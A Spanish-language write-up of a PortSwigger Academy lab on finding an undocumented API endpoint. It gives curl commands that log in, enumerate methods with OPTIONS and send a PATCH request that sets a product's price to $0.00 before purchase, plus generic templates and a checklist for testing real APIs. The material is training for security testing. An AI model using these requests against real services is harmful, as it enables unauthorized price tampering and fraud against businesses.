🎯 Lab: Finding and Exploiting an Unused API Endpoint

Nivel: Practitioner
Plataforma: PortSwigger Academy
Categoría: API Testing → Access Control
Fecha de Resolución: [Fecha Actual]
Herramientas: Termux, curl, bash, Kiwi Browser

---

📋 Descripción del Lab

El objetivo del lab es explotar un endpoint API oculto y no documentado para modificar el precio de un producto (Lightweight "l33t" Leather Jacket) a $0.00 y completar la compra. Las credenciales proporcionadas son: wiener:peter.

---

🧠 Conceptos Aprendidos

· Enumeración de APIs ocultas mediante métodos HTTP
· Uso del método OPTIONS para descubrir funcionalidades permitidas
· Explotación de endpoints PATCH no documentados
· Manejo de errores como guía para construir peticiones válidas
· Importancia del header Content-Type: application/json en APIs RESTful
· Manipulación de parámetros en cuerpos JSON

---

🔍 Metodología Paso a Paso

Fase 1: Reconocimiento

1. Login inicial con credenciales proporcionadas
   ```bash
   curl -c cookies.txt -d "username=wiener&password=peter" -X POST "$LAB_URL/login"
   ```
2. Enumeración del endpoint API oculto
   · Observación del tráfico en DevTools (Kiwi Browser)
   · Descubrimiento del endpoint: /api/products/1/price

Fase 2: Descubrimiento de Funcionalidades

1. Uso de método OPTIONS para enumerar métodos permitidos
   ```bash
   curl -X OPTIONS -b cookies.txt -v "$LAB_URL/api/products/1/price"
   ```
   Respuesta clave: allow: GET, PATCH → Se identifica que el endpoint permite PATCH

Fase 3: Explotación

1. Prueba inicial de PATCH (sin autenticación)
   ```bash
   curl -X PATCH -v "$LAB_URL/api/products/1/price"
   ```
   · Error: Requiere autenticación
2. PATCH autenticado (sin headers apropiados)
   ```bash
   curl -X PATCH -b cookies.txt -v "$LAB_URL/api/products/1/price"
   ```
   · Error: "Only 'application/json'"
3. Añadir Content-Type header
   ```bash
   curl -X PATCH -b cookies.txt -H "Content-Type: application/json" -v "$LAB_URL/api/products/1/price"
   ```
   · Error: "Could not parse JSON" (body vacío)
4. Añadir JSON body con errores de sintaxis (aprendizaje)
   ```bash
   curl -X PATCH -b cookies.txt -H "Content-Type: application/json" \
     -d '{{"price":"$00","message":"This item...}' \
     -v "$LAB_URL/api/products/1/price"
   ```
   · Error: JSON mal formado
5. JSON correcto y explotación exitosa
   ```bash
   curl -X PATCH -b cookies.txt \
     -H "Content-Type: application/json" \
     -d '{"price":0}' \
     -v "$LAB_URL/api/products/1/price"
   ```
   Respuesta exitosa: {"price":"$0.00"}

Fase 4: Verificación y Finalización

1. Confirmación del cambio
   ```bash
   curl -b cookies.txt "$LAB_URL/product?productId=1" | grep -i "price"
   ```
2. Compra del producto
   · Añadir al carrito desde navegador
   · Checkout final

---

🛠️ Comandos Clave para Pentesting APIs

1. Enumeración de Métodos

```bash
# Descubrir métodos HTTP permitidos
curl -X OPTIONS -v https://target.com/api/endpoint
```

2. Prueba de PATCH/PUT

```bash
# Plantilla para modificar recursos
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"parametro":"nuevo_valor"}' \
  -b "session=cookie" https://target.com/api/resource/id
```

3. Validación de Cambios

```bash
# Antes y después
curl -b cookies.txt https://target.com/resource
curl -X PATCH [comando de modificación]
curl -b cookies.txt https://target.com/resource # Verificar cambio
```

---

📝 Lecciones Aprendidas

Técnicas:

1. OPTIONS como herramienta de reconocimiento: Revela capacidades de endpoints
2. Error-driven development: Los mensajes de error guían la explotación
3. Validación de JSON: APIs son estrictos con sintaxis
4. Importancia de headers: Content-Type es crítico en APIs REST

Estrategias:

· Probar métodos HTTP alternativos (GET → PATCH/PUT/DELETE)
· Seguir el flujo de errores como mapa de ruta
· Verificar siempre el impacto de las modificaciones
· Documentar cada paso para replicación

---

🎯 Aplicación en Bug Bounty Real

Escenarios Comunes:

1. Endpoints PATCH/PUT no documentados que permiten modificación no autorizada
2. APIs internas expuestas accidentalmente
3. Lógica de negocio que no valida permisos en todos los métodos HTTP

Checklist para APIs:

· Probar OPTIONS en todos los endpoints
· Probar PATCH/PUT sin autenticación
· Probar PATCH/PUT con autenticación de usuario normal
· Verificar validación de parámetros
· Confirmar impacto con GET posterior

---

🔗 Recursos Relacionados

· PortSwigger: API Testing
· OWASP: API Security Top 10
· HTTP Methods for RESTful Services

---


---

👨‍💻 Notas del Investigador

"Este lab demostró la importancia de enumerar meticulosamente las capacidades de los endpoints API. Un simple método OPTIONS reveló funcionalidad PATCH no documentada que, combinada con falta de control de acceso, permitió modificación no autorizada de precios. La lección clave: siempre probar métodos HTTP más allá de GET/POST."

---

🔐 Keywords: API Security Access Control HTTP Methods PATCH Exploitation OPTIONS Enumeration IDOR Business Logic

---


